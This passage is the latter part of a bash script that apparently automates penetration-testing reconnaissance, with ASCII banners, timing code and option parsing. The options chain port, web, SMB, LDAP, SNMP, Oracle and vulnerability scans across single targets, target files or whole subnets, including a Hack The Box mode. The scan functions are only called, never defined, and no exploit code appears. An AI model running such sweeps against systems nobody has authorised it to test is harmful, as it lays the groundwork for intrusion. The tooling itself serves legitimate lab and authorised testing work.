 ::!!:!   :!:       :!:  !:!      !:!   :!:  :!:  !:!  :!:  !:!
  ::::     :: ::::  ::   :::  :::: ::    ::  ::::: ::   ::   ::
   :      : :: ::    :   : :  :: : :    :     : :  :   ::    :


     @@@         @@@@@@@@      @@@  @@@  @@@
    @@@@        @@@@@@@@@@     @@@  @@@  @@@
   @@!@!        @@!   @@@@     @@!  @@!  @@!
  !@!!@!        !@!  @!@!@     !@   !@   !@
 @!! @!!        @!@ @! !@!     @!@  @!@  @!@
!!!  !@!        !@!!!  !!!     !!!  !!!  !!!
:!!:!:!!:       !!:!   !!!
!:::!!:::  :!:  :!:    !:!     :!:  :!:  :!:
     :::   :::  ::::::: ::      ::   ::   ::
     :::   :::   : : :  :      :::  :::  :::

EOF
}

resetTimer() {
    SECONDS=0
}

timer() {

    echo -e "${TEAL}~~~~~~~~~~~~~~~~~~~~~~~ Scanning for $rhost Completed ~~~~~~~~~~~~~~~~~~~~~~~${END}"
    echo ""

    duration=$((duration + SECONDS))
    if (($SECONDS > 3600)) || (($duration > 3600)); then
        hours=SECONDS/3600
        totalhours=$duration/3600
        let "minutes=(SECONDS%3600)/60"
        let "seconds=(SECONDS%3600)%60"
        echo -e "${DOPE} Scanning $rhost Completed in $hours hour(s), $minutes minute(s) and $seconds second(s)"
        let "totalminutes=($duration%3600)/60"
        let "totalseconds=($duration%3600)%60"
        echo -e "${DOPE} All Scans Completed in $totalhours hour(s), $totalminutes minute(s) and $totalseconds second(s)"
    elif (($SECONDS > 60)) || (($duration > 60)); then
        let "minutes=(SECONDS%3600)/60"
        let "seconds=(SECONDS%3600)%60"
        echo -e "${DOPE} Scanning $rhost Completed in $minutes minute(s) and $seconds second(s)"
        let "totalminutes=($duration%3600)/60"
        let "totalseconds=($duration%3600)%60"
        echo -e "${DOPE} All Scans Completed in $totalminutes minute(s) and $totalseconds second(s)"
    else
        echo -e "${DOPE} This Scan Completed in $SECONDS seconds"
        echo -e "${DOPE} All Scans Completed in $duration seconds"
    fi
    echo -e ""
}

Remaining_Hosts_All_Scans() {
    echo -e "$rhost is the current RHOST!"
    grep -v $rhost live-hosts-ip.txt >remaining-hosts-to-scan.txt
    ip addr | grep -w inet | grep -v 127 | awk {'print $2'} | cut -d "/" -f 1 >myips.txt
    myipsFile=myips.txt
    gmyips=$(cat "$myipsFile")
    grep -v "$gmyips" remaining-hosts-to-scan.txt >remaininghosts.txt
    remainingHostsFileName=remaininghosts.txt
    hostsRemainingList=$(cat $remainingHostsFileName)
    baseip2=$(echo $rhost | cut -d "." -f1-3)
    cidr_range1=$(echo $baseip2".1")
    cidr_range2=$(echo $baseip2".2")
    cidr_range3=$(echo $baseip2".254")
    for target in $hostsRemainingList; do
        if [[ $target == "$cidr_range1" ]] || [[ $target == "$cidr_range2" ]] || [[ $target == "$cidr_range3" ]]; then
            :
        else
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            resetTimer
            Open_Ports_Scan
            Web_Vulns
            Web_Proxy_Scan
            Enum_Web
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            Enum_Web_SSL
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            ftp_scan
            smtp_enum
            nfs_enum
            screenshotWEB
            screenshotWEBSSL
            openInFireFox
            Intense_Nmap_UDP_Scan
            Enum_SMB
            rpc_enum
            ldap_enum
            cups_enum
            java_rmi_scan
            FULL_TCP_GOOD_MEASUERE_VULN_SCAN
            Enum_SNMP
            vulnscan
            Enum_Oracle
            Clean_Up
            timer
        fi

    done
    rm myips.txt
    rm remaining-hosts-to-scan.txt
    rm remaininghosts.txt
}

PeaceOut() {
    cat <<"EOF"
                          8888  8888888
                   888888888888888888888888
                8888:::8888888888888888888888888
              8888::::::8888888888888888888888888888
             88::::::::888:::8888888888888888888888888
           88888888::::8:::::::::::88888888888888888888
         888 8::888888::::::::::::::::::88888888888   888
            88::::88888888::::m::::::::::88888888888    8
          888888888888888888:M:::::::::::8888888888888
         88888888888888888888::::::::::::M88888888888888
         8888888888888888888888:::::::::M8888888888888888
          8888888888888888888888:::::::M888888888888888888
         8888888888888888::88888::::::M88888888888888888888
       88888888888888888:::88888:::::M888888888888888   8888
      88888888888888888:::88888::::M::;o*M*o;888888888    88
     88888888888888888:::8888:::::M:::::::::::88888888    8
    88888888888888888::::88::::::M:;:::::::::::888888888
   8888888888888888888:::8::::::M::aAa::::::::M8888888888       8
   88   8888888888::88::::8::::M:::::::::::::888888888888888 8888
  88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888
  8  8888888888888:::::::::::M::"@@@@@@@"::::8w8888888888888888
   88888888888:888::::::::::M:::::"@a@":::::M8i888888888888888
  8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888
 8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888
 888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888
 888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888
 8888   M::::::::::::::M88888888888::::::MM888888888888888    88888
  888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888
   888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888
    88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888
    88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88
    8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4
        8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2
       88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M
      8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M
     88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M
    88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:
    8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M
      88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M
     888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M
     888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8
     88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@
     8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@
      888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8
      888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M
       88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM
        88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM
         88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM
          88   8MM::::::::::::::::::::::::::::::::::MMMMMM
           8   88MM::::::::::::::::::::::M:::M::::::::MM
EOF
    echo ""
}

# Pre-process options to:
# - expand -xyz into -x -y -z
# - expand --longopt=argument into --longopt argument
ARGV=()
END_OF_OPT=
while [[ $# -gt 0 ]]; do
    argument="$1"
    shift
    case "${END_OF_OPT}${argument}" in
    --)
        ARGV+=("$argument")
        END_OF_OPT=1
        ;;
    --*=*) ARGV+=("${argument%%=*}" "${argument#*=}") ;;
    --*)
        ARGV+=("$argument")
        END_OF_OPT=1
        ;;
    -*) for i in $(seq 2 ${#argument}); do ARGV+=("-${argument:i-1:1}"); done ;;
    *) ARGV+=("$argument") ;;
    esac
done

# Apply pre-processed options
set -- "${ARGV[@]}"

# Parse options
END_OF_OPT=
POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "${END_OF_OPT}${1}" in
    -h | --help)
        helpFunction 0
        ;;
    -t | --target)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        openInFireFox 0
        ftp_scan 0
        smtp_enum 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        rpc_enum 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        PeaceOut 0
        timer 0
        ;;
    -f | --file)
        shift
        filearg=$1
        if [[ -f $filearg ]]; then
            targets=$(cat $filearg)
            for target in $targets; do
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                validate_IP
                banner1 0
                resetTimer 0
                Open_Ports_Scan 0
                Web_Vulns 0
                Web_Proxy_Scan 0
                Enum_Web 0
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                Enum_Web_SSL
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                screenshotWEB 0
                screenshotWEBSSL 0
                openInFireFox 0
                ftp_scan 0
                smtp_enum 0
                nfs_enum 0
                Intense_Nmap_UDP_Scan 0
                Enum_SMB 0
                rpc_enum 0
                cups_enum 0
                java_rmi_scan 0
                FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
                Enum_SNMP 0
                vulnscan 0
                Enum_Oracle 0
                Clean_Up 0
                timer 0
            done
        else
            echo -e "${NOTDOPE} File must be 1 IP Address per line."
        fi
        PeaceOut 0
        timer 0
        ;;
    -a | --all)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        resetTimer 0
        getUpHosts 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        openInFireFox 0
        ftp_scan 0
        smtp_enum 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        rpc_enum 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        Remaining_Hosts_All_Scans 0
        PeaceOut 0
        timer 0
        ;;
    -H | --HTB)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        ftp_scan 0
        smtp_enum 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        rpc_enum 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        dnsCheckHTB 0
        openInFireFox 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        PeaceOut 0
        timer 0
        ;;
    -v | --version)
        shift
        show_Version 0
        ;;
    -*)
        exitFunction "$@"
        shift 1
        ;;
    *)
        exitFunction "$@"
        shift 1
        ;;
    esac
    shift
done

set -- "${POSITIONAL[@]}"

if [[ "$#" -gt 2 ]]; then
    exitFunction
fi

traperr() {
    echo -e "${NOTDOPE} ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
}

set -o errtrace
trap traperr ERR

